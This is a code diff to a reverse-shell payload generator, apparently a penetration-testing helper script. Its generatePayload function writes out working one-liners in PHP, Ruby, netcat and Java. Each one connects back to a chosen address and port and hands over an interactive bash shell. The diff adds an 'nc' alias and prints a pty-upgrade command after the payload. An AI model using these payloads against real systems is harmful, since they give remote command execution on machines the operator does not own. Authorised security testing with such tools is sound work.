@@ -27,7 +27,7 @@ def generatePayload(type, local_address, port):
         return "php -r '$sock=fsockopen(\"%s\",%d);exec(\"/bin/bash -i <&3 >&3 2>&3\");'" % (local_address, port)
     elif type == "ruby":
         return "ruby -rsocket -e'f=TCPSocket.open(\"%s\",%d).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'" % (local_address, port)
-    elif type == "netcat":
+    elif type == "netcat" or type == "nc":
         return "nc -e /bin/bash %s %d\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc %s %d >/tmp/f" % (local_address, port, local_address, port)
     elif type == "java":
         return "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/%s/%d;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\np.waitFor()" % (local_address, port)
@@ -48,10 +48,11 @@ if __name__ == "__main__":
 
     if payload is None:
         print("Unknown payload type: %s" % payload_type)
-        print("Supported types: bash, perl, python[2|3], php, ruby, netcat, java, xterm")
+        print("Supported types: bash, perl, python[2|3], php, ruby, netcat|nc, java, xterm")
         exit(1)
 
-    print("---PAYLOAD---\n%s\n---PAYLOAD---\n" % payload)
+    tty = "python -c 'import pty; pty.spawn(\"/bin/bash\")"
+    print("---PAYLOAD---\n%s\n---TTY---\n%s\n---------\n" % (payload, tty))
 
     if payload_type == "xterm":
         print("You need to run the following commands (not tested):")
